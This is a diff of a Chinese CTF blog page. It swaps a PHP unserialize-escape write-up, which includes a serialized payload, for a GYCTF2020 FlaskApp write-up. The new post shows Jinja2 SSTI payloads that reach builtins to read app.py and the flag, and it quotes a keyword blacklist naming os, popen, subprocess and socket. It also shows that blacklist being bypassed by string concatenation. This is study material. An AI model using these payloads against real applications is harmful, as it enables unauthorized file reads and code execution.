@@ -8,13 +8,13 @@
   <meta name="theme-color" content="#fff" id="theme-color">
   <meta name="description" content="Husins">
   <link rel="icon" href="/img/dog.jpg">
-  <title>UNCTF之easyunserialize</title>
+  <title>GYCTF2020-FlaskApp</title>
   
   
-  <meta property="og:title" content="UNCTF之easyunserialize">
+  <meta property="og:title" content="GYCTF2020-FlaskApp">
   
   
-  <meta property="og:url" content="https://husins.cn/UNCTF%E4%B9%8Beasyunserialize/index.html">
+  <meta property="og:url" content="https://husins.cn/GYCTF2020-FlaskApp/index.html">
   
   
   <meta property="og:img" content="/img/dog.png">
@@ -22,12 +22,12 @@
   
   
   <meta property="og:type" content="article">
-  <meta property="og:article:published_time" content="2021-01-26">
-  <meta property="og:article:modified_time" content="2021-01-26">
+  <meta property="og:article:published_time" content="2021-05-18">
+  <meta property="og:article:modified_time" content="2021-05-18">
   <meta property="og:article:author" content="Husins">
   
   
-  <meta property="og:article:tag" content="UNCTF">
+  <meta property="og:article:tag" content="SSTI">
   
   
   
@@ -179,13 +179,13 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      UNCTF之easyunserialize
+      GYCTF2020-FlaskApp
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-01-26T09:58:42.000Z">
+    <time datetime="2021-05-18T12:33:11.000Z">
       <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
-      <span>2021-01-26</span>
+      <span>2021-05-18</span>
     </time>
     
     <span class="dot"></span>
@@ -195,7 +195,7 @@
     
     
     <span class="dot"></span>
-    <span>295 words</span>
+    <span>660 words</span>
     
   </div>
   
@@ -204,33 +204,50 @@
       <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
       
       
-        <a href="/tags/UNCTF/" class="post-meta-link">UNCTF</a>
+        <a href="/tags/SSTI/" class="post-meta-link">SSTI</a>
       
     </div>
   </div>
   
   </header>
   <div id="section" class="post-content">
-    <h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>PHP 在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾(数组、对象等类型)；反序列化时，结尾后的字符串会被忽略掉，当出现字符串替换函数得时候，就可以存在<strong>反序列化逃逸漏洞</strong></p>
-<p><strong>当替换后字符变多：</strong>由于膨胀，导致后面的字符被挤掉，所以执行我们传入的代码</p>
-<p><strong>当替换后字符变少：</strong>由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码</p>
-<h1 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h1><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sjanC4"><img src="https://s3.ax1x.com/2021/01/26/sjanC4.png" alt="sjanC4.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sjanC4.png" class="lozad post-image"></a></p>
-<p>经过分析，构造payload。</p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sjalK1"><img src="https://s3.ax1x.com/2021/01/26/sjalK1.png" alt="sjalK1.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sjalK1.png" class="lozad post-image"></a></p>
-<p><code>;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code></p>
-<p>得到我们要传入的参数（起始也可以直接写出来要是熟悉的话）</p>
-<p>我们发现这串字符有 29个。而我们根据替换只能控制溢出为4的倍数，<strong>因此这里有个骚姿势传入一个没有用的参数，使得我们构造的传参为4的倍数</strong></p>
-<p><strong>paylaod：</strong><code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;easy&quot;;&#125;</code></p>
-<p>此时是52个字符为4的倍数，构造脚本。</p>
-<p><img src="https://i.loli.net/2021/01/26/lPuRYh4isSE5yFq.png" alt="image-20201110165749619.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/lPuRYh4isSE5yFq.png" class="lozad post-image"></p>
-<p><img src="https://i.loli.net/2021/01/26/UJ6VwpcaFRh3AHW.png" alt="image-20201110165912185.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/UJ6VwpcaFRh3AHW.png" class="lozad post-image"></p>
+    <p>进入题目有三个页面，加密、解密和提示，分别对三个页面进行测试。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518181418340.png" alt="image-20210518181418340" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518181418340.png" class="lozad post-image"></p>
+<p>加密功能很正常，就是正常的加密。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518181433169.png" alt="image-20210518181433169" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518181433169.png" class="lozad post-image"></p>
+<p>解密输入字符或者数字会报错。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518181444455.png" alt="image-20210518181444455" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518181444455.png" class="lozad post-image"></p>
+<p>提示页面除了这个图片也没什么有用信息。</p>
+<p>因此只能在解密处观察报错信息：</p>
+<pre class="highlight"><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp) :<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res =  render_template_string(tmp)<br><br></code></pre>
+
+<p>根据报错我们发现，这里会把我们的传进去的加密字符串进行解密，其中包含<code>waf</code>代码应该是做了一定的过滤。因此只要我们能够绕过<code>waf</code>我们就可以，成功执行decode。这里回想题目是<code>FlaskAPP</code>,我们是不是可以做以下推论：<strong>假设这里存在SSTI注入，当我们base64编码模板语法之后，使用解密模块进行解密，是不是就能成功的将我们的数据通过解密携带出来。</strong></p>
+<p>因此尝试模板语法：</p>
+<p>​    <img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518201835864.png" alt="image-20210518201835864" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518201835864.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518201914481.png" alt="image-20210518201914481" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518201914481.png" class="lozad post-image"></p>
+<p>这里我们发现，事情好起来了呀，这里就是SSTI，通过解密将信息外带出来。</p>
+<p>根据报错信息我们知道文件名为<code>app.py</code>，因此读取源码，看看<code>waf</code>过滤了什么东西</p>
+<pre class="highlight"><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre>
+
+<p>得到<code>waf</code>函数的具体内容</p>
+<pre class="highlight"><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span> black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 </span><br></code></pre>
+
+<p>发现使用黑名单，过滤了很多的关键字，接下来的思路就很清晰了，绕过关键字过滤读取<code>flag</code></p>
+<p>这里直接使用字符串拼接的方式进行绕过，读取根目录文件</p>
+<pre class="highlight"><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre>
+
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518203038864.png" alt="image-20210518203038864" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518203038864.png" class="lozad post-image"></p>
+<p>发现<code>flag</code>就在根目录下，读取<code>flag</code></p>
+<pre class="highlight"><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre>
+
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518203201419.png" alt="image-20210518203201419" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210518203201419.png" class="lozad post-image"></p>
 
   </div>
   <div>
   
   <div class="post-note note-warning copyright" style="margin-top: 42px">
     <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
-    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/UNCTF%E4%B9%8Beasyunserialize/">https://husins.cn/UNCTF%E4%B9%8Beasyunserialize/</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/GYCTF2020-FlaskApp/">https://husins.cn/GYCTF2020-FlaskApp/</a></p>
     <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
   </div>
   
@@ -238,25 +255,13 @@
 </article>
 <div class="nav">
   
-  <div class="nav-item-prev">
-    <a href="/BJDCTF2020-EasyMD5/" class="nav-link">
-      <i class="iconfont icon-left nav-prev-icon"></i>
-      <div>
-        <div class="nav-label">Prev</div>
-        
-        <div class="nav-title">BJDCTF2020 EasyMD5 </div>
-        
-      </div>
-    </a>
-  </div>
-  
   
   <div class="nav-item-next">
-    <a href="/BUUCTF之-极客大挑战-2019-BuyFlag/" class="nav-link">
+    <a href="/De1CTF-2019-SSRF-Me/" class="nav-link">
       <div>
         <div class="nav-label">Next</div>
         
-        <div class="nav-title"># BUUCTF之[极客大挑战 2019]BuyFlag </div>
+        <div class="nav-title">De1CTF 2019_SSRF Me </div>
         
       </div>
       <i class="iconfont icon-right nav-next-icon"></i>
@@ -267,7 +272,7 @@
 
 <div class="card card-content toc-card" id="mobiletoc">
   <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-text">解题：</span></a>
+
 </div></main>
           <aside class="left-column">
             
@@ -300,7 +305,7 @@
   <article class="display-when-two-columns spacer">
     <div class="card card-content toc-card">
       <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-text">解题：</span></a>
+
     </div>
   </article>
   
@@ -406,7 +411,7 @@
   
   <article class="card card-content toc-card">
     <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-text">解题：</span></a>
+
   </article>
   
   
